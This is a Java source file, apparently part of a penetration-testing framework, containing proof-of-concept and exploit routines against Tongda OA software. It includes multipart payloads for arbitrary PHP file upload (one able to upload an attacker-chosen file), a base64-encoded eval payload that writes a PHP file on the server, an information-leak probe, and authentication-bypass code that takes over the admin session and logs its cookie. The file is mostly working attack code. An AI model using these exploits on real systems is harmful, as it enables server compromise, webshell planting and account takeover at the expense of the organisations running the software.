package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;
import com.achuna33.Utils.Utils;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@BasicMapping(uri = "通达")
public class TongDaController extends Controller implements BasicController{
    public TongDaController(){}

@VulnerabilityDescriptionMapping(Description = "通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_get_contactlist信息泄露(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    WriteLog("\n[*]开始检测：  通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞");

    String url = "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3";
    switch (type) {
        case EXP:
            WriteLog("\n vul_get_contactlist信息泄露 没有Exp");
            break;
        case POC:
            target = target + url;
            HttpRequest httpRequest = new HttpRequest(target);
            Response response = httpRequest.Get("");
            if (response.statusCode==200){
                WriteLog("\n vul_get_contactlist信息泄露 存在漏洞");
            }else {
                WriteLog("\n vul_get_contactlist信息泄露 不存在漏洞");
            }
    }
}
@VulnerabilityDescriptionMapping(Description = "通达OA v2017 action_upload.php 任意文件上传漏洞",SupportVulType =SupportVul.UploadFile )
    public void vul_action_upload文件上传(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    WriteLog("\n[*]开始检测：  通达OA v2017 action_upload.php 任意文件上传漏洞");

    String url = "/module/ueditor/php/action_upload.php?action=uploadfile";
    String data = "-----------------------------55719851240137822763221368724\r\n" +
            "Content-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n" +
            "\r\n" +
            "ffff\r\n" +
            "-----------------------------55719851240137822763221368724\r\n" +
            "Content-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n" +
            "\r\n" +
            "1000000000\r\n" +
            "-----------------------------55719851240137822763221368724\r\n" +
            "Content-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n" +
            "\r\n" +
            "tcmd\r\n" +
            "-----------------------------55719851240137822763221368724\r\n" +
            "Content-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n" +
            "\r\n" +
            ".php\r\n" +
            "-----------------------------55719851240137822763221368724\r\n" +
            "Content-Disposition: form-data; name=\"ffff\"; filename=\"test.php\"\r\n" +
            "Content-Type: application/octet-stream\r\n" +
            "\r\n" +
            "<?php phpinfo();?>\r\n" +
            "-----------------------------55719851240137822763221368724\r\n" +
            "Content-Disposition: form-data; name=\"mufile\"\r\n" +
            "\r\n" +
            "submit\r\n" +
            "-----------------------------55719851240137822763221368724--";
    switch (type) {
        case EXP:

            if (args!=null){
                String path = (String) args[0];
                String mypayload = "";
                String RandomExp =Utils.getRandomString(5);
                try {
                    byte[] bytes = Utils.readFile(path);
                    mypayload = new String(bytes);
                }catch (Exception e){
                    WriteExpLog("\n [*] 文件读取失败");
                }
                data = data.replace("tcmd","RandomExp");
                data = data.replace("<?php phpinfo();?>",mypayload);
                HttpRequest httpRequest = new HttpRequest(target + url);
                httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=---------------------------55719851240137822763221368724");
                Response response = httpRequest.Post(data);

                HttpRequest httpRequest2 = new HttpRequest(target + "/"+RandomExp+".php");
                Response response2 = httpRequest2.Get("");

                if (response.statusCode==200 && response2.statusCode==200){
                    WriteLog("\n vul_action_upload文件上传 存在漏洞");
                }else {
                    WriteLog("\n vul_action_upload文件上传 不存在漏洞");
                }
            }else {
                WriteExpLog("\n 请指定文件路径");
            }
            break;
        case POC:

            HttpRequest httpRequest = new HttpRequest(target + url);
            httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=---------------------------55719851240137822763221368724");
            Response response = httpRequest.Post(data);

            HttpRequest httpRequest2 = new HttpRequest(target + "/tcmd.php");
            Response response2 = httpRequest2.Get("");

            if (response.statusCode==200 && response2.statusCode==200){
                WriteLog("\n vul_action_upload文件上传 存在漏洞");
            }else {
                WriteLog("\n vul_action_upload文件上传 不存在漏洞");
            }
    }
}

@VulnerabilityDescriptionMapping(Description = "通达OA v11.5 login_code.php 任意用户登录",SupportVulType = SupportVul.信息泄露)
    public void vul_session泄露(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    WriteLog("\n[*]开始检测：  通达OA v11.5 login_code.php 任意用户登录");

    switch (type) {
        case EXP:
            WriteLog("\n[*] vul_信息泄露漏洞 没有Exp");
            break;
        case POC:
            getV11Session(target);
    }
}
@VulnerabilityDescriptionMapping(Description = "通达OA v11.9 upsharestatus 后台SQL注入漏洞" ,SupportVulType = SupportVul.SQLInjection)
public void vul_upsharestatusSqlInjection(Poc_Exp type, String target,Object... args){
    switch (type) {
        case EXP:
            WriteLog("\n vul_upsharestatusSqlInjection 没有Exp");
            break;
        case POC:
            WriteLog("\n 漏洞需要相关参数，无法自动验证 http://www.i-dock.net/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20upsharestatus%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html");
    }
}

@VulnerabilityDescriptionMapping(Description = "通达OA v11.8 api.ali.php 任意文件上传漏洞", SupportVulType = SupportVul.UploadFile)
public void vul_api_ali_UploadFile(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    WriteLog("\n[*]开始检测：  通达OA v11.8 api.ali.php 任意文件上传漏洞");

    switch (type) {
        case EXP:
            WriteExpLog("\n vul_api_ali_UploadFile 没有Exp");
            WriteExpLog("\n 移步看: http://www.i-dock.net/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html");
            break;
        case POC:
            String data = "\n" +
                    "--502f67681799b07e4de6b503655f5cae\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"fb6790f4.json\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "\r\n" +
                    "{\"modular\":\"AllVariable\",\"a\":\"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}\r\n" +
                    "--502f67681799b07e4de6b503655f5cae--\r\n";
            HttpRequest httpRequest = new HttpRequest(target+"/mobile/api/api.ali.php");
            httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae");
            httpRequest.Post(data);

            HttpRequest httpRequest1 = new HttpRequest(target+"/inc/package/work.php?id=../../../../../myoa/attach/approve_center/2209/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4");
            Response response = httpRequest1.Get("");
            if (response.responseBody.contains("OK")){
                WriteLog("vul_api_ali_UploadFile 存在漏洞");
            }else {
                WriteLog("\nvul_api_ali_UploadFile 不存在漏洞");
            }

    }
}
public Boolean getV11Session(String target) throws MalformedURLException {
    try {
        String checkUrl = target + "/general/login_code.php";

        String resText = new HttpRequest(checkUrl).Get("").responseBody;
        String[] resTextSplit = resText.split("\\{");
        String codeUid = resTextSplit[resTextSplit.length-1].replace("}\"}", "").replace("\r\n", "");
        String data = "CODEUID=" + codeUid + "&UID=1"; //{'CODEUID': '{'+codeUid+'}', 'UID': int(1)}；
        Response response = new HttpRequest(target + "/logincheck_code.php").Post(data);

        HttpRequest req = new HttpRequest(target + "/general/index.php");
        String tmp_cookie= null;
        //检测
        try {
            tmp_cookie = response.responseHeader.get("Set-Cookie").toString();
            tmp_cookie = tmp_cookie.replace("[","");
            tmp_cookie = tmp_cookie.replace("]","");
            req.addHeaders("Cookie", tmp_cookie);

        }catch (Exception e){

        }
        Response response1 = req.Get("");

        if (!response1.responseBody.contains("window.top.location='/'")) {
                WriteLog("\n getV11Session 检测到漏洞 Session：" + response1.requestHeader.get("Cookie"));
                WriteLog("\n 拿着session 去登录" + target+"/general/index.php");

            return true;
        } else {
            WriteLog("\n getV11Session 未检测到漏洞 ");
            return false;
        }


    } catch (Exception e) {
        WriteLog("\n function getV11Session 出现异常");
        return false;
    }
}

public void get2017Session(String target){
    try {
        String checkUrl = target + "/ispirit/login_code.php";

        String resText = new HttpRequest(checkUrl).Get("").responseBody;
        JSONObject json = JSONObject.parseObject(resText);

        String codeUid = (String) json.get("codeuid");
        String data = "codeuid=" + codeUid + "&UID=1&source=pc&type=confirm&username=admin"; //{'CODEUID': '{'+codeUid+'}', 'UID': int(1)}；
        Response response = new HttpRequest(target + "/general/login_code_scan.php").Post(data);
        JSONObject json2 = JSONObject.parseObject(response.responseBody);

        String status = (String) json2.get("status");
        if (status.contains("1")){
            String check = target + "/ispirit/login_code_check.php?codeuid=" + codeUid;
            HttpRequest req = new HttpRequest(check);
            Response response1 = req.Get("");
            //获取cookie
            String tmp_cookie = null;

            String index = target + "/general/index.php";
            HttpRequest request = new HttpRequest(index);
            try {
                tmp_cookie = response1.responseHeader.get("Set-Cookie").toString();
                tmp_cookie = tmp_cookie.replace("[","");
                tmp_cookie = tmp_cookie.replace("]","");
                request.addHeaders("Cookie", tmp_cookie);

            }catch (Exception e){

            }
            Response response2 =  request.Get("");
            if (!response2.responseBody.contains("window.top.location='/'")) {
                WriteLog("\n getV11Session 检测到漏洞 Session：" + response2.requestHeader.get("Cookie"));
                WriteLog("\n 拿着session 去登录" + target+"/general/index.php");

                return ;
            } else {
                WriteLog("\n getV11Session 未检测到漏洞 ");
                return ;
            }
        }else {

        }





    } catch (Exception e) {
        WriteLog("\n function getV11Session 出现异常");
        return ;
    }
}
    public static void main(String[] args) {
        List<String> test = new ArrayList<>();
        test.add("123");
        test.add("456");
        System.out.println(test);
    }
}
